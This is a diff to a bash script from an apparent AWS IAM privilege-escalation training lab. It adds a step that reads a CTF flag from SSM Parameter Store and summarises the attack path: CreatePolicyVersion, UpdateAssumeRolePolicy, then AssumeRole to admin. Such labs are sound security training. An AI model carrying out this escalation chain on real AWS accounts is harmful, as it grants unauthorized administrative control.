@@ -371,12 +371,27 @@ else
 fi
 echo ""
 
+# [EXPLOIT]
+# Step 14: Capture the CTF flag
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-020-to-admin"
+echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (no admin permissions)"
@@ -386,11 +401,12 @@ echo "4. Used iam:UpdateAssumeRolePolicy to modify trust policy of $TARGET_ROLE_
 echo "5. Trust policy now explicitly allows $STARTING_USER to assume the role"
 echo "6. Assumed $TARGET_ROLE_NAME (which has the admin policy attached)"
 echo "7. Achieved: Full administrative access to the AWS account"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (CreatePolicyVersion) → $TARGET_POLICY (v2 admin)"
 echo "  → (UpdateAssumeRolePolicy) → $TARGET_ROLE_NAME trust"
-echo "  → (AssumeRole) → Admin Access"
+echo "  → (AssumeRole) → Admin Access → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
